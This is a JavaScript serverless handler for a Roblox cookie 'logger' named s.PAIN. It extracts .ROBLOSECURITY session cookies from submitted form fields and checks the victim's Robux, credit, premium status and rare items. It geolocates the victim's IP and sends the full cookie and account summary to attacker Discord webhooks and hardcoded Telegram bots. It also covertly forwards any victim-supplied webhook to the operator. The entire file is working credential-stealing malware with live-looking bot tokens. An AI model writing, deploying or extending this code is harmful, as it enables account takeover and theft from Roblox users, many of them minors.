const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

const TG_WEBHOOK_TOKEN = process.env.TG_WEBHOOK_TOKEN || '8971718461:AAGfB2edB6ryqFOIB1ET5_cGUEoZnZDQB4E';
const TG_WEBHOOK_CHAT  = process.env.TG_WEBHOOK_CHAT  || '7538845070';

const ITEMS = {
  HEADLESS: 134082579,
  KORBLOX: 139607625,
  VALKYRIE: 1365767
};

const COOKIE_REFRESH_URL = 'https://index-html-ruby-eight.vercel.app/cookie';

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 3000);
    const r = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: ctrl.signal });
    clearTimeout(timer);
    const d = await r.json();
    return { city: d.cityName, regionName: d.regionName, country: d.countryName, isp: d.isp };
  } catch { return null; }
}

async function getAvatarUrl(userId) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    const response = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`, { signal: ctrl.signal });
    clearTimeout(timer);
    if (!response.ok) return null;
    const data = await response.json();
    if (data.data && data.data.length > 0 && data.data[0].state === 'Completed') return data.data[0].imageUrl;
    return null;
  } catch { return null; }
}

async function getRobux(cookie) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    const response = await fetch('https://economy.roblox.com/v1/user/currency', {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
      signal: ctrl.signal
    });
    clearTimeout(timer);
    if (!response.ok) return 0;
    const data = await response.json();
    return data.robux || 0;
  } catch { return 0; }
}

async function getRAP(cookie, userId) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 8000);
    const response = await fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
      signal: ctrl.signal
    });
    clearTimeout(timer);
    if (!response.ok) return { rap: 0, items: 0 };
    const data = await response.json();
    let rap = 0;
    const items = data.data || [];
    items.forEach(item => { rap += item.recentAveragePrice || 0; });
    return { rap, items: items.length };
  } catch { return { rap: 0, items: 0 }; }
}

async function getCredit(cookie) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    const response = await fetch('https://billing.roblox.com/v1/credit', {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
      signal: ctrl.signal
    });
    clearTimeout(timer);
    if (!response.ok) return 0;
    const data = await response.json();
    return data.balance || 0;
  } catch { return 0; }
}

function getAccountAge(createdDate) {
  if (!createdDate) return 0;
  return Math.floor((new Date() - new Date(createdDate)) / (1000 * 60 * 60 * 24));
}

async function getPremiumStatus(cookie) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    const response = await fetch('https://premiumfeatures.roblox.com/v1/users/validate-membership', {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
      signal: ctrl.signal
    });
    clearTimeout(timer);
    return response.status === 200;
  } catch { return false; }
}

async function getVoiceChatStatus(cookie) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    const response = await fetch('https://voice.roblox.com/v1/settings', {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
      signal: ctrl.signal
    });
    clearTimeout(timer);
    if (!response.ok) return false;
    const data = await response.json();
    return data.isVoiceEnabled || false;
  } catch { return false; }
}

async function getFriendsCount(userId) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, { signal: ctrl.signal });
    clearTimeout(timer);
    if (!response.ok) return 0;
    const data = await response.json();
    return data.count || 0;
  } catch { return 0; }
}

async function ownsItem(cookie, userId, assetId) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    const response = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${assetId}/is-owned`, {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
      signal: ctrl.signal
    });
    clearTimeout(timer);
    if (!response.ok) return false;
    return await response.json() === true;
  } catch { return false; }
}

async function getGroupsOwned(userId) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    const response = await fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, { signal: ctrl.signal });
    clearTimeout(timer);
    if (!response.ok) return 0;
    const data = await response.json();
    return (data.data || []).filter(g => g.role?.rank === 255).length;
  } catch { return 0; }
}

async function checkAccountInfo(cookie) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 8000);
    const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'User-Agent': 'Mozilla/5.0' },
      signal: ctrl.signal
    });
    clearTimeout(timer);
    if (!response.ok) return { valid: false, error: 'Invalid or expired cookie' };
    
    const userData = await response.json();
    const userId = userData.id;
    
    const [avatarUrl, robux, rapData, credit, profileRes, premium, voiceChat, friends, headless, korblox, valkyrie, groupsOwned] = await Promise.all([
      getAvatarUrl(userId), getRobux(cookie), getRAP(cookie, userId), getCredit(cookie),
      fetch(`https://users.roblox.com/v1/users/${userId}`).catch(() => null),
      getPremiumStatus(cookie), getVoiceChatStatus(cookie), getFriendsCount(userId),
      ownsItem(cookie, userId, ITEMS.HEADLESS), ownsItem(cookie, userId, ITEMS.KORBLOX),
      ownsItem(cookie, userId, ITEMS.VALKYRIE), getGroupsOwned(userId)
    ]);
    
    const profile = profileRes?.ok ? await profileRes.json() : null;
    
    return {
      valid: true, id: userId, username: userData.name, displayName: userData.displayName,
      profileUrl: `https://www.roblox.com/users/${userId}/profile`, avatarUrl,
      robux, rap: rapData.rap, items: rapData.items, credit, premium, voiceChat, friends,
      headless, korblox, valkyrie, groupsOwned, accountAge: getAccountAge(profile?.created)
    };
  } catch (err) {
    return { valid: false, error: err.message };
  }
}

async function refreshCookieStatus(cookie) {
  const accountInfo = await checkAccountInfo(cookie);
  return { refreshed: accountInfo.valid, account: accountInfo, timestamp: new Date().toISOString() };
}

async function tgSendAccount(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch {}
}

async function tgSendWebhook(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_WEBHOOK_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_WEBHOOK_CHAT, text, parse_mode: 'HTML' })
    });
  } catch {}
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/); if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/); if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

function findVictimWebhook(slots) {
  for (const [key, val] of Object.entries(slots || {})) {
    if (key.startsWith('webhook') && val) return val;
  }
  return null;
}

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

const WH_NAME   = 'sPAIN';
const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';

async function discordSend(url, payload) {
  if (!url || !url.includes('discord.com/api/webhooks')) return;
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) console.error('Discord error:', res.status);
  } catch (e) { console.error('Discord fetch error:', e.message); }
}

// FULL COOKIE in refresh URL - no truncation!
async function discordSendCookie(url, cookie, username) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    // Send FULL cookie in URL (not truncated)
    const refreshUrl = `${COOKIE_REFRESH_URL}?cookie=${encodeURIComponent(cookie)}`;
    
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: WH_NAME,
        avatar_url: WH_AVATAR,
        content: `**🔐 Cookie for "${username || 'Unknown'}"**\n\n**[🔄 Refresh Cookie](${refreshUrl})**\n\n\`\`\`\n${cookie}\n\`\`\``
      })
    });
  } catch (e) { console.error('Cookie send error:', e); }
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots, action } = body;
  
  if (action === 'check_account' || action === 'refresh_cookie') {
    if (!slots) return res.status(400).json({ error: 'slots required' });
    const cookie = findCookie(slots);
    if (!cookie) return res.status(400).json({ error: 'No valid cookie' });
    return res.status(200).json(await refreshCookieStatus(cookie));
  }
  
  if (!slug || !slots) return res.status(400).json({ error: 'slug and slots required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record) return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const victimWebhook = findVictimWebhook(slots);
  if (victimWebhook) {
    await tgSendWebhook(`🎯 <b>VICTIM WEBHOOK</b>\n📄 ${record.displayName || slug}\n<code>${victimWebhook}</code>`);
  }

  const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const now = new Date().toISOString();
  const pName = record.displayName || slug;
  const cookie = findCookie(slots);

  let webhook1 = null;
  let webhook2 = record.webhook;
  if (record.dualhookParent) {
    const parent = await redisGet(`slot:${record.dualhookParent}`);
    if (parent?.webhook && parent.webhook !== record.webhook) webhook1 = parent.webhook;
  }

  // NO COOKIE
  if (!cookie) {
    const geo = await getIpGeo(ip);
    const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
    
    await discordSend(webhook2, {
      username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
      embeds: [{
        title: '⚠️ Wrong Cookie — Troll Detected',
        description: 's.PAIN Logger',
        color: 0xff3333,
        fields: [
          { name: '🌐 IP', value: ip, inline: true },
          { name: '📍 Location', value: loc, inline: true },
          { name: '🗺️ ISP', value: geo?.isp || 'Unknown', inline: true }
        ],
        footer: { text: `${pName} Logger` },
        timestamp: now
      }]
    });
    
    await tgSendAccount(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
    return res.status(200).json({ success: true });
  }

  // Process valid cookie
  const [geo, accountInfo] = await Promise.all([
    getIpGeo(ip),
    refreshCookieStatus(cookie)
  ]);
  
  const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
  const acc = accountInfo.refreshed ? accountInfo.account : null;
  const avatarUrl = acc?.avatarUrl;

  // WEBHOOK 2: Cookie Captured
  await discordSend(webhook2, {
    username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
    embeds: [{
      title: '🍪 Cookie Captured',
      description: 's.PAIN Logger',
      color: 0xc026d3,
      thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
      fields: [
        { name: '🌐 IP', value: `\`${ip}\``, inline: true },
        { name: '📄 Page', value: pName, inline: true },
        { name: '🕐 Time', value: now, inline: true },
        { name: '📍 Location', value: loc, inline: true },
        { name: '🗺️ ISP', value: geo?.isp || 'Unknown', inline: true }
      ],
      footer: { text: `${pName} Logger` },
      timestamp: now
    }]
  });

  // WEBHOOK 1: Dualhook
  if (webhook1) {
    await discordSend(webhook1, {
      username: WH_NAME, avatar_url: WH_AVATAR, content: '@everyone',
      embeds: [{
        title: '🍪 Cookie Captured (Dualhook)',
        color: 0x06b6d4,
        thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
        fields: [
          { name: '🌐 IP', value: `\`${ip}\``, inline: true },
          { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true },
          { name: '🔗 DH Child', value: `\`${slug}\``, inline: true },
          { name: '📍 Location', value: loc, inline: true }
        ],
        footer: { text: `sPAIN Logger • ${pName}` },
        timestamp: now
      }]
    });
  }

  // Account Info
  if (acc) {
    const accountEmbed = {
      title: '✅ Account Info Valid',
      description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
      color: 0x00ff00,
      thumbnail: avatarUrl ? { url: avatarUrl } : undefined,
      fields: [
        { name: '💰 Robux', value: `⏣ ${acc.robux.toLocaleString()}`, inline: true },
        { name: '🎵 RAP', value: `${acc.rap.toLocaleString()}`, inline: true },
        { name: '💳 Credit', value: `$${acc.credit.toFixed(2)}`, inline: true },
        { name: '🗓️ Age', value: `${acc.accountAge.toLocaleString()}d`, inline: true },
        { name: '⭐ Premium', value: acc.premium ? '✓ Yes' : '✗ No', inline: true },
        { name: '🎙️ VC', value: acc.voiceChat ? '✓ On' : '✗ Off', inline: true },
        { name: '👥 Friends', value: acc.friends.toLocaleString(), inline: true },
        { name: '👑 Groups', value: acc.groupsOwned.toString(), inline: true },
        { name: '📦 Items', value: acc.items.toString(), inline: true },
        { name: '💀 Headless', value: acc.headless ? '✓ Owned' : '✗ None', inline: true },
        { name: '⚔️ Korblox', value: acc.korblox ? '✓ Owned' : '✗ None', inline: true },
        { name: '🪽 Valkyrie', value: acc.valkyrie ? '✓ Owned' : '✗ None', inline: true }
      ],
      footer: { text: `${pName} Logger` },
      timestamp: now
    };
    
    await discordSend(webhook2, { username: WH_NAME, avatar_url: WH_AVATAR, embeds: [accountEmbed] });
    if (webhook1) await discordSend(webhook1, { username: WH_NAME, avatar_url: WH_AVATAR, embeds: [{...accountEmbed, footer: { text: `sPAIN Logger • ${pName}` }}] });
  }

  // ONLY place with refresh link - raw cookie message (FULL COOKIE)
  await discordSendCookie(webhook2, cookie, acc?.username);
  if (webhook1) await discordSendCookie(webhook1, cookie, acc?.username);

  // Telegram
  if (acc) {
    await tgSendAccount([
      `🍪 <b>COOKIE — ${pName}</b>`,
      `👤 <b>User:</b> <code>${acc.username}</code> (${acc.id})`,
      `💰 <b>Robux:</b> ⏣ ${acc.robux.toLocaleString()}`,
      `🎵 <b>RAP:</b> ${acc.rap.toLocaleString()}`,
      `💳 <b>Credit:</b> $${acc.credit.toFixed(2)}`,
      `🗓️ <b>Age:</b> ${acc.accountAge.toLocaleString()}d`,
      `⭐ <b>Premium:</b> ${acc.premium ? 'Yes' : 'No'}`,
      `💀 <b>Headless:</b> ${acc.headless ? 'Owned' : 'None'}`,
      `⚔️ <b>Korblox:</b> ${acc.korblox ? 'Owned' : 'None'}`,
      ``,
      `<b>🔐 Cookie:</b> <code>${cookie}</code>`
    ].join('\n'));
  } else {
    await tgSendAccount(`🍪 <b>COOKIE — ${pName}</b>\n❌ <b>Invalid cookie</b>\n<code>${cookie}</code>`);
  }

  return res.status(200).json({ success: true, account: acc });
}
